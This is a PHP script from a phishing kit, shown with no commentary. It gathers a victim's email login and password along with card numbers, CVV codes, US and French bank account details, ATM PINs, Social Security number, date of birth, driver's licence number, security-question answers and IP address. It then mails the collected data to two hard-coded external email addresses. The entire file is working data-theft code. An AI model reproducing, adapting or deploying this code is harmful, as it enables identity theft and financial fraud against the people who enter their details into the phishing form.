<?php

$ip = getenv("REMOTE_ADDR");
$message .= "-----------------------ReZulT-----------------------\n";
$message .= "Email Address                 : ".$_SESSION['emaill']."\n";
$message .= "Password                      : ".$_SESSION['passwordd']."\n";
$message .= "\n";
$message .= "---------------------------\n";
$message .= "\n";
$message .= "Full Name                     : ".$_POST['fullname']."\n";
$message .= "Card Type                     : ".$_POST['card_type']."\n";
$message .= "Card Number                   : ".$_POST['defaultcardnumber']."\n";
$message .= "Expiration Date               : ".$_POST['defaultexpmonth']."/";
$message .= "".$_POST['defaultexpyear']."\n";
$message .= "Card Verification Number      : ".$_POST['defaultcvv2']."\n";

$message .= "\n============================================================\n";
$message .= "US BANK :\n";
$message .= "============================================================\n\n";

$message .= "Account Number                : ".$_POST['accountnumber']."\n";
$message .= "Routing Number                : ".$_POST['routingnumber']."\n";
$message .= "ATM PIN                       : ".$_POST['atmpin']."\n";

$message .= "\n============================================================\n";
$message .= "FR BANK :\n";
$message .= "============================================================\n\n";

$message .= "FR BANK FR :\n";
$message .= "____________\n\n";
		$message .= "Bank Name                : ".$_POST['bankname']."\n";
		$message .= "Agency                   : ".$_POST['agence']."\n";
		$message .= "Bank Account  :                 \n";
		$message .= "Bank Code \t|\t Branch Code \t|\t Account Number \t|\t Key RIB \n";
		$message .= $_POST['codeb']." \t\t|\t\t  ".$_POST['codeg']." \t\t|\t\t ".$_POST['nmcmp']." \t\t|\t\t ".$_POST['rib']." \n\n";
		
$message .= "FR BANK US :\n";
$message .= "____________\n\n";
	
		$message .= "Account Number                : ".$_POST['accountnumber2']."\n";
		$message .= "Routing Number                : ".$_POST['routingnumber2']."\n";
		$message .= "ATM PIN                       : ".$_POST['atmpin2']."\n";

$message .= "============================================================\n\n";

$message .= "Address 1                     : ".$_POST['defaultaddress1']."\n";
$message .= "Address 2                     : ".$_POST['defaultaddress2']."\n";
$message .= "City                          : ".$_POST['defaultcity']."\n";
$message .= "State                         : ".$_POST['defaultstate']."\n";
$message .= "ZIP Code                      : ".$_POST['defaultzip']."\n";
$message .= "Country                       : ".$_POST['defaultcountry']."\n";
$message .= "Telephone                     : ".$_POST['userphone']."\n";
$message .= "Social Security Number        : ".$_POST['ssn']."\n";
$message .= "Date Of Birth                 : ".$_POST['bday']."/";
$message .= "".$_POST['bmonth']."/";
$message .= "".$_POST['byear']."\n";
$message .= "Driver's License              : ".$_POST['drl']."\n";
$message .= "\n";
$message .= "---------------------------\n";
$message .= "\n";
$message .= "Security Question 1           : ".$_POST['question1']."\n";
$message .= "Answer 1                      : ".$_POST['answer1']."\n";
$message .= "Security Question 2           : ".$_POST['question2']."\n";
$message .= "Answer 2                      : ".$_POST['answer2']."\n";
$message .= "IP                            : ".$ip."\n";
$message .= "\n\n";
$message .= "---------------Created By unknown------------------------------\n";

$to = "goto.fire@yahoo.com,euro12football@gmail.com";

$subject = "SP REZULT";
$headers = "From: AdAmMeD<NewStuff>";
$headers = "MIME-Version: 1.0\n";
$from = "ADAMMED SP";

mail($to,$subject,$message,$headers,$from);



?>